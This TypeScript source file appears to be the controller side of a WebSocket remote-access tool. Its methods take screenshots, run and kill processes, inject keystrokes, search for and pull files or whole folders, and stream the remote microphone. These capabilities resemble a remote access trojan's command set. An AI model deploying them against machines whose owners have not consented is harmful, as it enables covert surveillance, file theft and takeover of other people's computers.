import { WebSocket } from 'ws';
import { randomUUID } from 'node:crypto';
import OpusScript from 'opusscript';
import Methods from './Methods';
import { ScanTypes } from '../enums/ScanTypes';

const opusEncoder = new OpusScript(48000, 1, OpusScript.Application.AUDIO);
export default class ClientManager {
    public handler: WebSocket;
    public remoteAddress: string;

    private procHandlers: Array<{
        uniqueId: string;
        resolve: (value: any) => void
    }> = [];
    private listenEventsHandlers: Array<{
        eventName: string;
        callback: (...args: any[]) => void
    }> = [];

    constructor(handler: WebSocket, remoteAddress: string) {
        this.handler = handler;
        this.remoteAddress = remoteAddress;
        this.handler.on('message', (data) => {
            const { eventName, uniqueId, args, procValue }: { eventName: string, uniqueId: string, args: any[], procValue?: any } = JSON.parse(data.toString());
            
            if(eventName === 'procReturn' && typeof(procValue) !== 'undefined') {
                const index = this.procHandlers.findIndex(f => f.uniqueId === uniqueId);
                if(index === -1) return;
                this.procHandlers[index].resolve(procValue);
                this.procHandlers.splice(index, 1);
            } else {
                const listenEvent = this.listenEventsHandlers.find(f => f.eventName === eventName);
                if(!listenEvent) return;
                listenEvent.callback(...args);
            }
        });
    }

    call(eventName: string, ...args: any[]) {
        const uniqueId = randomUUID();
        this.handler.send(Methods.eventParser(eventName, uniqueId, args, 'default'));
    }

    callProc(eventName: string, ...args: any[]): Promise<any> {
        return new Promise(resolve => {
            const uniqueId = randomUUID();
            this.procHandlers.push({ uniqueId, resolve });
            this.handler.send(Methods.eventParser(eventName, uniqueId, args, 'proc'))
        });
    }

    listen(eventName: string, callback: (...args: any[]) => void) {
        if(this.listenEventsHandlers.some(s => s.eventName === eventName)) return;
        this.listenEventsHandlers.push({ eventName, callback });
    }

    shutdown() {
        this.call("shutdown");
    }

    restart() {
        this.call("restart");
    }

    setVolume(volume: number) {
        this.call("set_volume", volume / 100);
    }

    getVolume(): Promise<number> {
        return this.callProc("get_volume");
    }

    getName(): Promise<string> {
        return this.callProc("get_name");
    }

    takeScreenshot(): Promise<Buffer> {
        return new Promise(async resolve => {
            const base64: string = await this.callProc("take_screenshot");
            resolve(Buffer.from(base64, "base64"));
        });
    }

    openProcess(...args: any[]): Promise<number> {
        return this.callProc("open_process", ...args);
    }

    killProcess(pid: number) {
        this.call("kill_process", pid);
    }

    emulateKeyCombination(key: string) {
        this.call("emulate_key_combination", key);
    }

    searchFile(path: string, query: string, scanType: keyof typeof ScanTypes): Promise<string[]> {
        return new Promise(async resolve => {
            const result = await this.callProc("search_file", path, query, ScanTypes[scanType]);
            resolve(result);
        });
    }

    takeFile(path: string): Promise<{ fileName: string, fileMimeType: string, fileData: Buffer }> {
        return new Promise(async resolve => {
            const { fileName, fileMimeType, fileBase64DecodedString }: { fileName: string, fileMimeType: string, fileBase64DecodedString: string } = await this.callProc("take_file", path);
            resolve({
                fileName,
                fileMimeType,
                fileData: Buffer.from(fileBase64DecodedString, 'base64'),
            });
        });
    }

    takeFiles(rootPath: string): Promise<{ fileName: string, fileLocation: string, fileMimeType: string, fileData: Buffer }[]> {
        return new Promise(async resolve => {
            const files: { fileName: string, fileLocation: string, fileMimeType: string, fileBase64DecodedString: string }[] = await this.callProc("take_files", rootPath);
            resolve(files.map(({ fileName, fileLocation, fileMimeType, fileBase64DecodedString }) => ({
                fileName,
                fileLocation,
                fileMimeType,
                fileData: Buffer.from(fileBase64DecodedString, 'base64'),
            })));
        });
    }

    enableMicrophoneListen(callback: (chunk: Buffer) => void) {
        this.call('enable_microphone_listen');
        this.listen('microphone_listen_data', (data: string) => {
            const frameSize = 48000 * 20 / 1000;
            const oldChunk = Buffer.from(data, 'base64');
            try {
                const encodedChunk = opusEncoder.encode(oldChunk, frameSize);
                callback(encodedChunk);
            } catch {
                callback(oldChunk);
            }
        });
    }

    disableMicrophoneListen() {
        this.call('disable_microphone_listen');
    }
};